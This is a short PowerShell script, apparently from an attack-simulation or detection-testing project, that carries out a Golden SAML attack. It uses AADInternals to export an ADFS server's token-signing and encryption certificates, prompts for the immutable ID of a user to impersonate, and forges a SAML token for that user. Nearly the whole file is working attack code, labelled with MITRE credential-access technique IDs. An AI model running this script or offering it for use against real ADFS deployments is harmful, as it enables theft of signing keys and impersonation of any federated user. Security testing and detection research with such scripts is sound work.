<#
.SYNOPSIS
This part of the attack connects to an ADFS server, steals its keys and generates a SAML token

.DESCRIPTION
TA0006: Credential Access
T1606.002: Forge Web Credentials - SAML Tokens
1st attack method
#>

# We make use of AADInternals
Get-Module | Where-Object name -eq use-aadtools | Remove-Module -Verbose
Import-Module ../APIs/use-aadtools.psm1

# Save the ADFS signing and encryption certificates to a new folder, we only need the former
New-Item -Path $env:TEMP -Name "TA0006 - T1602.002 - A1" -ItemType Directory
Set-Location "$env:TEMP/TA0006 - T1602.002 - A1" 
Export-AADIntADFSCertificates

$immutableId = Read-Host "Immutable ID of user to impersonate"
$token = New-AADIntSAMLToken -ImmutableId $immutableId -PfxFileName "./ADFS_signing.pfx" -Issuer "http://detectabil.it/adfs/services/trust/" -UPN "thisisanattack"

Write-Warning "SamlToken:"
Write-Host $token